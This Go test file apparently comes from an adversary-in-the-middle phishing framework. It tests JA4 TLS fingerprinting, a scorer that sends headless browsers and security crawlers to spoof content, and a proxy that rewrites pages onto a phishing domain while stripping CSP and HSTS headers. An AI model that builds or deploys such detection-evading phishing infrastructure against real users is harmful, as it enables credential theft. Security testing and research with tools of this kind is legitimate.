package botguard_test

import (
	"fmt"
	"log/slog"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/botguard"
)

// ── JA4 computation ───────────────────────────────────────────────────────────

func TestComputeJA4_KnownVector(t *testing.T) {
	hello := buildTestClientHello(t, clientHelloParams{
		version:      0x0303,
		cipherSuites: []uint16{0x1301, 0x1302, 0x1303, 0xc02b, 0xc02f},
		extensions:   []uint16{0x0000, 0x000a, 0x000d, 0x0010, 0x002b},
		groups:       []uint16{0x001d, 0x0017, 0x0018},
		sni:          "mail.attacker.com",
		alpn:         []string{"h2"},
		suppVersions: []uint16{0x0304},
	})

	ja4, err := botguard.ComputeJA4(hello)
	if err != nil {
		t.Fatalf("ComputeJA4: %v", err)
	}
	if !strings.HasPrefix(ja4, "t13d") {
		t.Errorf("expected prefix t13d, got: %s", ja4)
	}
	parts := strings.Split(ja4, "_")
	if len(parts) != 3 {
		t.Errorf("expected 3 segments, got %d: %s", len(parts), ja4)
	}
	for i, segment := range parts[1:] {
		if len(segment) != 12 {
			t.Errorf("segment %d: expected 12 hex chars, got %q", i+1, segment)
		}
	}
}

func TestComputeJA4_GREASEFiltered(t *testing.T) {
	// A ClientHello with GREASE cipher 0x0a0a mixed in — should not affect Part B hash.
	hello1 := buildTestClientHello(t, clientHelloParams{
		cipherSuites: []uint16{0x0a0a, 0x1301}, // 0x0a0a is GREASE
		extensions:   []uint16{0x0000},
		suppVersions: []uint16{0x0304},
	})
	hello2 := buildTestClientHello(t, clientHelloParams{
		cipherSuites: []uint16{0x1301}, // no GREASE
		extensions:   []uint16{0x0000},
		suppVersions: []uint16{0x0304},
	})
	ja4a, err := botguard.ComputeJA4(hello1)
	if err != nil {
		t.Fatalf("ComputeJA4 hello1: %v", err)
	}
	ja4b, err := botguard.ComputeJA4(hello2)
	if err != nil {
		t.Fatalf("ComputeJA4 hello2: %v", err)
	}
	// Part B (cipher hash) must be identical when only GREASE differs.
	if strings.Split(ja4a, "_")[1] != strings.Split(ja4b, "_")[1] {
		t.Errorf("cipher hash differs: %s vs %s", ja4a, ja4b)
	}
}

func TestComputeJA4_InvalidBytes(t *testing.T) {
	_, err := botguard.ComputeJA4([]byte{0x00, 0x01, 0x02})
	if err == nil {
		t.Error("expected error for short/invalid bytes, got nil")
	}
}

// ── helloConn ─────────────────────────────────────────────────────────────────

func TestHelloConn_CapturesFirstRecord(t *testing.T) {
	payload := buildTestClientHello(t, clientHelloParams{
		version:      0x0303,
		cipherSuites: []uint16{0x1301},
		suppVersions: []uint16{0x0304},
		extensions:   []uint16{0x0000},
	})

	clientConn, serverConn := net.Pipe()
	hc := botguard.NewHelloConnForTest(serverConn)

	go func() {
		clientConn.Write(payload)
		clientConn.Close()
	}()

	buf := make([]byte, 4096)
	n, _ := hc.Read(buf)
	if n == 0 {
		t.Fatal("expected to read bytes, got 0")
	}

	captured := hc.Hello()
	if captured == nil {
		t.Fatal("Hello() returned nil after read")
	}
	if len(captured) < n {
		t.Errorf("captured %d bytes, read %d", len(captured), n)
	}
}

// ── Scorer (verdict) ──────────────────────────────────────────────────────────

func TestScorer_DisabledAlwaysAllows(t *testing.T) {
	scorer := &botguard.Scorer{Config: botguard.BotGuardConfig{Enabled: false}, Logger: slog.Default()}
	verdict := scorer.ScoreConnection(nil)
	if verdict != aitm.VerdictAllow {
		t.Errorf("expected VerdictAllow when disabled, got %v", verdict)
	}
}

func TestScorer_HighTelemetryScoreReturnsVerdictSpoof(t *testing.T) {
	scorer := &botguard.Scorer{Config: botguard.BotGuardConfig{Enabled: true, TelemetryThreshold: 0.6}, Logger: slog.Default()}
	// SwiftShader renderer + 0 mouse moves + pixel_ratio 1.0 + device_memory 0 → score > 0.6
	telem := &aitm.BotTelemetry{Raw: map[string]any{
		"webgl_renderer":   "ANGLE (SwiftShader)",
		"mouse_move_count": float64(0),
		"pixel_ratio":      float64(1.0),
		"device_memory":    float64(0),
		"fonts_detected":   float64(1),
	}}
	verdict := scorer.ScoreConnection(telem)
	if verdict != aitm.VerdictSpoof {
		t.Errorf("expected VerdictSpoof for high telemetry score, got %v", verdict)
	}
}

// ── SpoofProxy ────────────────────────────────────────────────────────────────

func TestSpoofProxy_RewritesDomainsInResponse(t *testing.T) {
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		fmt.Fprintf(w, `<html><a href="https://%s/login">login</a></html>`, r.Host)
	}))
	defer backend.Close()

	sp := botguard.NewSpoofProxy(slog.Default())
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodGet, "/", nil)
	req.Host = "phishing.attacker.com"

	sp.ServeHTTP(rec, req, backend.URL, &aitm.ProxyContext{})

	body := rec.Body.String()
	// The backend's host (127.0.0.1:port) must be replaced with the phishing domain.
	if !strings.Contains(body, "phishing.attacker.com") {
		t.Errorf("expected phishing domain in response body, got: %s", body)
	}
}

func TestSpoofProxy_EmptySpoofURLReturns200(t *testing.T) {
	sp := botguard.NewSpoofProxy(slog.Default())
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodGet, "/", nil)
	sp.ServeHTTP(rec, req, "", &aitm.ProxyContext{})
	if rec.Code != http.StatusOK {
		t.Errorf("expected 200 OK, got %d", rec.Code)
	}
}

func TestSpoofProxy_StripsCORSHeaders(t *testing.T) {
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Security-Policy", "default-src 'self'")
		w.Header().Set("Strict-Transport-Security", "max-age=31536000")
		w.WriteHeader(http.StatusOK)
	}))
	defer backend.Close()

	sp := botguard.NewSpoofProxy(slog.Default())
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodGet, "/", nil)
	sp.ServeHTTP(rec, req, backend.URL, &aitm.ProxyContext{})

	if rec.Header().Get("Content-Security-Policy") != "" {
		t.Errorf("expected CSP header to be stripped, got: %s", rec.Header().Get("Content-Security-Policy"))
	}
	if rec.Header().Get("Strict-Transport-Security") != "" {
		t.Errorf("expected HSTS header to be stripped, got: %s", rec.Header().Get("Strict-Transport-Security"))
	}
}

// ── Helpers ───────────────────────────────────────────────────────────────────

type clientHelloParams struct {
	version      uint16
	cipherSuites []uint16
	extensions   []uint16
	groups       []uint16
	sni          string
	alpn         []string
	suppVersions []uint16
}

// buildTestClientHello constructs a minimal but valid TLS ClientHello byte sequence.
func buildTestClientHello(t *testing.T, params clientHelloParams) []byte {
	t.Helper()

	var body []byte

	// legacy_version (2 bytes)
	version := params.version
	if version == 0 {
		version = 0x0303
	}
	body = append(body, byte(version>>8), byte(version))

	// random (32 bytes)
	body = append(body, make([]byte, 32)...)

	// session_id_len (0)
	body = append(body, 0x00)

	// cipher_suites
	csLen := len(params.cipherSuites) * 2
	body = append(body, byte(csLen>>8), byte(csLen))
	for _, cs := range params.cipherSuites {
		body = append(body, byte(cs>>8), byte(cs))
	}

	// compression_methods (1 byte: null)
	body = append(body, 0x01, 0x00)

	// extensions
	var extBuf []byte
	if params.sni != "" {
		extBuf = append(extBuf, buildSNIExtension(params.sni)...)
	}
	if len(params.suppVersions) > 0 {
		extBuf = append(extBuf, buildSuppVersionsExtension(params.suppVersions)...)
	}
	if len(params.groups) > 0 {
		extBuf = append(extBuf, buildGroupsExtension(params.groups)...)
	}
	if len(params.alpn) > 0 {
		extBuf = append(extBuf, buildALPNExtension(params.alpn)...)
	}
	// Add any remaining extensions as empty.
	for _, extType := range params.extensions {
		if extType == 0x0000 || extType == 0x002b || extType == 0x000a || extType == 0x0010 {
			continue // already emitted above
		}
		extBuf = append(extBuf, byte(extType>>8), byte(extType), 0x00, 0x00)
	}
	body = append(body, byte(len(extBuf)>>8), byte(len(extBuf)))
	body = append(body, extBuf...)

	// Handshake header: type(1) + length(3)
	var hsMsg []byte
	hsMsg = append(hsMsg, 0x01) // ClientHello
	hsMsg = append(hsMsg, 0x00, byte(len(body)>>8), byte(len(body)))
	hsMsg = append(hsMsg, body...)

	// TLS record header: type(1) + version(2) + length(2)
	var record []byte
	record = append(record, 0x16)                                  // ContentType: Handshake
	record = append(record, 0x03, 0x01)                            // record version (TLS 1.0)
	record = append(record, byte(len(hsMsg)>>8), byte(len(hsMsg))) // length
	record = append(record, hsMsg...)
	return record
}

func buildSNIExtension(hostname string) []byte {
	nameBytes := []byte(hostname)
	entry := []byte{0x00, byte(len(nameBytes) >> 8), byte(len(nameBytes))}
	entry = append(entry, nameBytes...)
	listLen := len(entry)
	data := []byte{byte(listLen >> 8), byte(listLen)}
	data = append(data, entry...)
	return buildExtension(0x0000, data)
}

func buildSuppVersionsExtension(versions []uint16) []byte {
	data := []byte{byte(len(versions) * 2)}
	for _, v := range versions {
		data = append(data, byte(v>>8), byte(v))
	}
	return buildExtension(0x002b, data)
}

func buildGroupsExtension(groups []uint16) []byte {
	listLen := len(groups) * 2
	data := []byte{byte(listLen >> 8), byte(listLen)}
	for _, g := range groups {
		data = append(data, byte(g>>8), byte(g))
	}
	return buildExtension(0x000a, data)
}

func buildALPNExtension(protos []string) []byte {
	var protoList []byte
	for _, proto := range protos {
		protoList = append(protoList, byte(len(proto)))
		protoList = append(protoList, []byte(proto)...)
	}
	data := []byte{byte(len(protoList) >> 8), byte(len(protoList))}
	data = append(data, protoList...)
	return buildExtension(0x0010, data)
}

func buildExtension(extType uint16, data []byte) []byte {
	ext := []byte{byte(extType >> 8), byte(extType)}
	ext = append(ext, byte(len(data)>>8), byte(len(data)))
	ext = append(ext, data...)
	return ext
}
